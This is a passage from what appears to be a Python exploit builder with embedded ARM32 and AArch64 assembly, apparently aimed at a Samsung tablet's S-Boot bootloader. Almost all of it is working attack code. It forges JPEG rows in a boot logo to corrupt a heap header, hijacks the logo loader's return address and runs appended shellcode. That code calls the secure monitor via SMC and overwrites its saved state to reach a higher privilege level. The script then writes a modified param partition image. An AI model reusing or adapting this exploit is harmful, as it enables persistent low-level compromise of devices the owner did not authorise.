    movt    r6, #0x02FA
    adr     r4, 9f
    b       wait
9:
    movw    r1, #0xFFFF             /* white band: alive after 0x400 */
    movt    r1, #0xFF
    adr     r4, 9f
    b       band
9:
blink:                              /* alive: blue and white take turns, for as long as the tablet is left like this */
    movw    r1, #0xFF
    movt    r1, #0
    adr     r4, 9f
    b       band
9:
    movw    r6, #0x1B58
    movt    r6, #0x1DCD             /* 500 million turns, about a second */
    adr     r4, 9f
    b       wait
9:
    movw    r1, #0xFFFF
    movt    r1, #0xFF
    adr     r4, 9f
    b       band
9:
    movw    r6, #0x1B58
    movt    r6, #0x1DCD
    adr     r4, 9f
    b       wait
9:
    b       blink
halt:
    b       halt
wait:                                  /* r6 iterations; returns to r4 */
    subs    r6, r6, #1
    bne     wait
    bx      r4
band:                                  /* r1 colour; clobbers r0 and r2; returns to r4 */
    movw    r0, #0
    movt    r0, #0x6700
    add     r2, r0, #0x60000
11: str     r1, [r0], #4
    cmp     r0, r2
    blo     11b
    movw    r0, #0
    movt    r0, #0x6700
12: mcr     p15, 0, r0, c7, c10, 1
    add     r0, r0, #64
    cmp     r0, r2
    blo     12b
    dsb     sy
    bx      r4

                                        /* exception vectors: a white bar for a fault, a cyan one for an interrupt */
    .balign 32
vectors32:
    b       halt                    /* reset */
    b       vec_undef               /* 0x04: LR_und = next instruction */
    b       vec_svc                 /* 0x08: LR_svc = next + 4 */
    b       vec_pabt                /* 0x0C: LR_abt = faulting + 4 */
    b       vec_dabt                /* 0x10: LR_abt = faulting + 8 */
    b       vec_hyp                 /* 0x14: Hyp trap */
    b       vec_irq                 /* 0x18: LR_irq = next + 4 */
    b       vec_fiq                 /* 0x1C: banked r8-r14 */
vec_undef:
    movw    r0, #0x80               /* bar x = 32..35 */
    b       white_resume
vec_pabt:
    movw    r0, #0x70               /* bar x = 28..31 */
    b       white_resume
vec_svc:
    movw    r0, #0x90               /* bar x = 36..39 */
    b       white_skip
vec_dabt:
    movw    r0, #0x60               /* bar x = 24..27 */
    b       white_skip
vec_hyp:
    movw    r0, #0xA0               /* bar x = 40..43 */
    movw    r1, #0xFFFF
    movt    r1, #0xFF
    b       paint_eret
white_resume:
    movw    r1, #0xFFFF
    movt    r1, #0xFF
    b       paint_resume
white_skip:
    movw    r1, #0xFFFF
    movt    r1, #0xFF
    b       paint_skip
vec_irq:
    mrs     r2, spsr
    orr     r2, r2, #0xC0           /* keep IRQ and FIQ masked after the return */
    msr     spsr_c, r2
    movw    r0, #0x40               /* bar x = 16..19 */
    movw    r1, #0xFFFF             /* cyan */
    movt    r1, #0
    b       paint_irq
paint_irq:
    movw    r2, #0
    movt    r2, #0x6700
    add     r0, r2, r0
    str     r1, [r0]
    str     r1, [r0, #4]
    str     r1, [r0, #8]
    str     r1, [r0, #12]
    mcr     p15, 0, r0, c7, c10, 1
    mrs     r3, spsr
    and     r3, r3, #0x1F
    cmp     r3, #0x1A
    beq     23f
    subs    pc, lr, #4
23: eret
paint_resume:
    movw    r2, #0
    movt    r2, #0x6700
    add     r0, r2, r0
    str     r1, [r0]
    str     r1, [r0, #4]
    str     r1, [r0, #8]
    str     r1, [r0, #12]
    mcr     p15, 0, r0, c7, c10, 1
    mrs     r3, spsr
    and     r3, r3, #0x1F
    cmp     r3, #0x1A
    beq     24f
    subs    pc, lr, #0
24: eret
paint_skip:
    movw    r2, #0
    movt    r2, #0x6700
    add     r0, r2, r0
    str     r1, [r0]
    str     r1, [r0, #4]
    str     r1, [r0, #8]
    str     r1, [r0, #12]
    mcr     p15, 0, r0, c7, c10, 1
    mrs     r3, spsr
    and     r3, r3, #0x1F
    cmp     r3, #0x1A
    beq     25f
    sub     lr, lr, #4              /* four past the instruction that faulted */
    subs    pc, lr, #0
25: mrc     p15, 0, r3, c4, c2, 0   /* ELR_hyp */
    add     r3, r3, #4
    mcr     p15, 0, r3, c4, c2, 0
    eret
paint_eret:
    movw    r2, #0
    movt    r2, #0x6700
    add     r0, r2, r0
    str     r1, [r0]
    str     r1, [r0, #4]
    str     r1, [r0, #8]
    str     r1, [r0, #12]
    mcr     p15, 0, r0, c7, c10, 1
    eret
vec_fiq:
    mrs     r10, spsr
    orr     r10, r10, #0xC0
    msr     spsr_c, r10
    movw    r8, #0x50               /* bar x = 20..23 */
    movt    r8, #0x6700
    movw    r9, #0xFFFF             /* cyan */
    movt    r9, #0
    str     r9, [r8]
    str     r9, [r8, #4]
    str     r9, [r8, #8]
    str     r9, [r8, #12]
    mcr     p15, 0, r8, c7, c10, 1
    mrs     r10, spsr
    and     r10, r10, #0x1F
    cmp     r10, #0x1A
    beq     26f
    subs    pc, lr, #4
26: eret
"""


PAINT_SOURCE = """                /* paint only: proof that the hijack transfers control, nothing else */
    .syntax unified
    .arm
    .section .text,"ax",%progbits
    .global _start
_start:                         /* the loader's saved return address now holds N */
    b       paint
    .word   0                   /* free() tests this byte and stops */
    .word   0                   /* free() writes prev here */
    .word   0
paint:                          /* rows 0..511, the top quarter of the screen, solid green */
    movw    r0, #0
    movt    r0, #0x6700
    movw    r1, #0xFF00
    movt    r1, #0
    add     r2, r0, #0x300000
1:  str     r1, [r0], #4
    cmp     r0, r2
    blo     1b
halt:
    b       halt
"""

A32_ENTRY_SOURCE = """
    .syntax unified
    .arm
    .section .text,"ax",%progbits
    .global _start
_start:                         /* the monitor entered here in AArch32, Hyp mode if the state it recorded was honoured */
    mrs     r2, cpsr
    and     r2, r2, #0x1F
    cmp     r2, #0x1A
    bne     1f
    mrc     p15, 4, r4, c1, c0, 0    /* HSCTLR */
    bic     r0, r4, #1
    mcr     p15, 4, r0, c1, c0, 0    /* MMU off: addresses become physical */
    isb
    b       2f
1:  mov     r4, #0
2:  movw    r0, #0xFF00
    movt    r0, #0x242F             /* the cell */
    movw    r1, #0x3241
    movt    r1, #0x2132             /* "A32!" */
    str     r1, [r0, #0xC]
    str     r2, [r0, #0x10]
    str     r4, [r0, #0x14]
    add     r1, r0, #64
    mcr     p15, 0, r0, c7, c10, 1
    mcr     p15, 0, r1, c7, c10, 1
    dsb     sy
    movw    r0, #0
    movt    r0, #0x6700
    movw    r1, #0xFF
    movt    r1, #0                  /* blue, over the ARM32 stub's band */
    add     r12, r0, #0x60000
3:  str     r1, [r0], #4
    cmp     r0, r12
    blo     3b
    movw    r0, #0
    movt    r0, #0x6700
4:  mcr     p15, 0, r0, c7, c10, 1
    add     r0, r0, #64
    cmp     r0, r12
    blo     4b
    dsb     sy
                                        /* row 64: one white pixel per unit of the mode; row 65: of HSCTLR's low byte */
    and     r2, r2, #0xFF
    and     r3, r4, #0xFF
    movw    r1, #0xFFFF
    movt    r1, #0x00FF              /* white */
    movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
    cmp     r2, #0
    beq     6f
5:  str     r1, [r0], #4
    subs    r2, r2, #1
    bne     5b
6:  movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
    add     r0, r0, #0x1800          /* row 65 */
    cmp     r3, #0
    beq     8f
7:  str     r1, [r0], #4
    subs    r3, r3, #1
    bne     7b
8:  movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
    add     r2, r0, #0x3000
9:  mcr     p15, 0, r0, c7, c10, 1
    add     r0, r0, #64
    cmp     r0, r2
    blo     9b
    dsb     sy
                                        /* second stage: the context the first call filled, found by the entry it holds */
    movw    r5, #0x4300
    movt    r5, #0x0203              /* the monitor's table of context pointers */
    mov     r6, #0
    mov     r7, #8
    movw    r12, #ENTRY_LO
    movt    r12, #ENTRY_HI
10: ldr     r8, [r5], #4
    ldr     r9, [r5], #4
    orrs    r10, r8, r9
    beq     11f
    ldr     r11, [r8, #0x118]
    cmp     r11, r12
    moveq   r6, r8
11: subs    r7, r7, #1
    bne     10b
    cmp     r6, #0
    movwne  r5, #0x4300
    movtne  r5, #0x0203
    ldrne   r6, [r5]
    movw    r0, #0xFF00
    movt    r0, #0x242F
    str     r6, [r0, #0x18]
    mcr     p15, 0, r0, c7, c10, 1
    dsb     sy
                                        /* call again, 64-bit variant, and replace the recorded state before it is used */
    movw    r7, #0x03C6             /* AArch64 EL2h, all exceptions masked */
    movw    r0, #0x0400
    movt    r0, #0x8200
    movw    r1, #ENTRY_LO
    movt    r1, #ENTRY_HI
    mov     r2, #0x800
    mov     r3, #1
    smc     #0
    str     r7, [r6, #0x110]
    ldr     r8, [r6, #0x120]
    orr     r8, r8, #0x2000         /* bit 13, "lower ELs AArch64", if that field is SCR_EL3 */
    str     r8, [r6, #0x120]
    movw    r6, #0xF080
    movt    r6, #0x02FA
12: subs    r6, r6, #1
    bne     12b
    movw    r0, #0                 /* still here: the call returned and nothing came */
    movt    r0, #0x6700
    movw    r1, #0xFF00             /* green */
    movt    r1, #0
    add     r2, r0, #0x60000
13: str     r1, [r0], #4
    cmp     r0, r2
    blo     13b
    movw    r0, #0
    movt    r0, #0x6700
14: mcr     p15, 0, r0, c7, c10, 1
    add     r0, r0, #64
    cmp     r0, r2
    blo     14b
    dsb     sy
halt:
    b       halt
"""


A32_ENTRY_DISTANCE = 0x42004     # where the first word's AArch32 branch lands: 8 + 0x107FF * 4


def build_payload(work: Path, code_offset: int) -> tuple[bytes, int, int]:
    """The file bytes from offset ``code_offset`` on, the AArch64 entry, the end to clean."""
    code_address = FILE_BUFFER + code_offset
    text_base = (code_address + STUB_ROOM + 2047) & ~2047   # the exception vectors need a 2 KiB boundary
    defines = {
        "STACK_LO": lo(STACK), "STACK_HI": hi(STACK),
        "FONT_LO": lo(text_base), "FONT_HI": hi(text_base),
        "STR1_LO": lo(text_base + 0x100), "STR1_HI": hi(text_base + 0x100),
        "STR2_LO": lo(text_base + 0x180), "STR2_HI": hi(text_base + 0x180),
        "SCR_LO": lo(text_base + 0x200), "SCR_HI": hi(text_base + 0x200),
        "VEC_LO": lo(text_base + 0x800), "VEC_HI": hi(text_base + 0x800),
        "CELL_LO": lo(CELL), "CELL_HI": hi(CELL),
    }
    a64 = assemble(a64_source(text_base), "aarch64-none-elf", work, "payload64", defines)
    a64_entry_slice = TEXT_PAD
    entry = text_base + TEXT_PAD
    clean_start = (code_address + TRAMPOLINES + 63) & ~63
    a32 = assemble(A32_ENTRY_SOURCE, "arm-none-eabi", work, "entry32", {"ENTRY_LO": lo(entry), "ENTRY_HI": hi(entry)})
    a32_entry = entry + A32_ENTRY_DISTANCE
    clean_end = (a32_entry + len(a32) + 63) & ~63
    stub = assemble(PAINT_SOURCE if PAINT_ONLY else A32_SOURCE, "arm-none-eabi", work, "stub32", {
        "CLEAN_START_LO": lo(clean_start), "CLEAN_START_HI": hi(clean_start),
        "CLEAN_END_LO": lo(clean_end), "CLEAN_END_HI": hi(clean_end),
        "ENTRY_LO": lo(entry), "ENTRY_HI": hi(entry),
        "CELL_LO": lo(CELL), "CELL_HI": hi(CELL),
    })
    assert len(stub) <= STUB_ROOM - TRAMPOLINES, len(stub)
    blob = bytearray()
    for phase in range(3):            # b to the stub, then the zero free() tests, then room for its write
        address = code_address + 16 * phase
        blob += struct.pack("<I", 0xEA000000 | (((code_address + TRAMPOLINES - address - 8) >> 2) & 0xFFFFFF)) + bytes(12)
    blob += bytes(TRAMPOLINES - len(blob)) + stub
    blob += bytes(STUB_ROOM - len(blob))
    blob += bytes(text_base - code_address - len(blob))
    blob += a64
    if not PAINT_ONLY:
        blob += bytes(a32_entry - code_address - len(blob))
        blob += a64[a64_entry_slice:]
    return bytes(blob), entry, clean_end


def plan(width: int, reach: np.ndarray) -> None:
    """Which shifts of the estimate a width forges: the three shifts classes need three widths."""
    for w in range(width, width + 48, 16):
        layout = Layout(w)
        shifts = [k for k in range(-4, 5) if layout.forged(layout.estimate + 16 * k)]
        print(f"width {w}: estimate {layout.estimate:#010x} at +{layout.estimate - layout.row_start(layout.row_of_estimate)} "
              f"in row {layout.row_of_estimate} of {layout.height}, forged shifts (x16 bytes): {shifts}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("stock_param", type=Path, nargs="?")
    parser.add_argument("out_param", type=Path, nargs="?")
    parser.add_argument("--width", type=int, default=16378)
    parser.add_argument("--out-jpeg", type=Path)
    parser.add_argument("--plan", action="store_true", help="only show what the widths forge")
    parser.add_argument("--paint-only", action="store_true", help="a stub that only paints the top quarter green")
    args = parser.parse_args()
    global PAINT_ONLY
    PAINT_ONLY = args.paint_only
    reach = bc.reachability()
    if args.plan:
        plan(args.width, reach)
        return 0
    if not (args.stock_param and args.out_param):
        parser.error("need STOCK_PARAM and OUT_PARAM")

    layout = Layout(args.width)
    work = Path(args.out_param).parent
    stock = args.stock_param.read_bytes()
    heap_row, heap_offset, heap_row_bytes, heap_slot = heap_header(reach, layout)
    print(f"width {layout.width}, stride {layout.stride}, {layout.height} rows; lowest header estimated at "
          f"{layout.estimate:#010x} ({layout.estimate - layout.row_start(layout.row_of_estimate)} bytes into row "
          f"{layout.row_of_estimate}); forged rows {layout.first_forged_row}..{layout.height - 1} write "
          f"{layout.row_start(layout.first_forged_row):#010x}..{layout.row_start(layout.height - 1) + layout.row_bytes:#010x}")
    print(f"target: saved return address of the logo loader at {LR_SLOT:#010x}, so prev {PREV:#010x}; "
          f"the estimate is forged by this image: {layout.forged(layout.estimate)}")

    # The code address is written in every forged slot, so it moves the JPEG length: repeat
    # until the code sits at least MARGIN bytes after the compressed image.
    margin = 0x8000
    found = find_code_addresses(reach, PREV, 0)
    for _ in range(6):
        if found is None:
            print("FAIL: no representable code addresses in the file buffer")
            return 1
        offset, nexts = found
        solved = solve_row(reach, layout, nexts)
        if solved is None:
            print(f"FAIL: a pixel of a forged row is not exactly decodable (code at offset {offset:#x})")
            return 1
        row, yccs, last_slot_end = solved
        jpeg = build_jpeg(layout, row, yccs, last_slot_end, heap_row, heap_offset, heap_row_bytes)
        if offset >= len(jpeg) + margin:
            break
        found = find_code_addresses(reach, PREV, (len(jpeg) + margin + 15) & ~15)
    else:
        print("FAIL: the JPEG length does not settle")
        return 1
    problems = verify(jpeg, layout, row, heap_row, heap_row_bytes)
    for problem in problems[:10]:
        print("PROBLEM:", problem)
    if problems:
        print(f"FAIL: {len(problems)} row(s) differ after decoding")
        return 1
    print(f"jpeg: {len(jpeg)} bytes, sha256 {hashlib.sha256(jpeg).hexdigest()[:16]}; every forged row decodes exactly; "
          f"the free block's header in row {heap_row} at +{heap_offset}: {heap_slot.hex(' ')}")

    logo = bytearray(jpeg)
    logo += bytes(offset - len(logo))
    payload, entry, _ = build_payload(work, offset)
    logo += payload
    assert len(logo) <= FILE_BUFFER_SIZE, "logo.jpg does not fit the file buffer"
    print(f"code at {FILE_BUFFER + offset:#010x} (file offset {offset:#x}), ARM32 stub {payload[:4].hex()}..., "
          f"AArch64 entry {entry:#010x}, payload {len(payload)} bytes; file {len(logo)} bytes")
    with Image.open(io.BytesIO(bytes(logo))) as image:  # the appended code must not upset a decoder
        image.load()

    param = bytearray(bc.replace_logo(stock, bytes(logo)))
    end = max(i for i in range(0, DATA_AT, 512) if any(param[i:i + 512])) + 512   # where the rebuilt archive ends
    assert end + 1024 <= DATA_AT, f"the archive reaches {end:#x}, into S-Boot's data"
    param[DATA_AT:] = stock[DATA_AT:]    # the builder zeroes everything past the archive; S-Boot keeps data there
    args.out_param.write_bytes(bytes(param))
    if args.out_jpeg:
        args.out_jpeg.write_bytes(bytes(logo))
    print(f"{args.out_param}: {len(param)} bytes, sha256 {hashlib.sha256(param).hexdigest()}")
    plan(args.width, reach)
    return 0


if __name__ == "__main__":
    sys.exit(main())
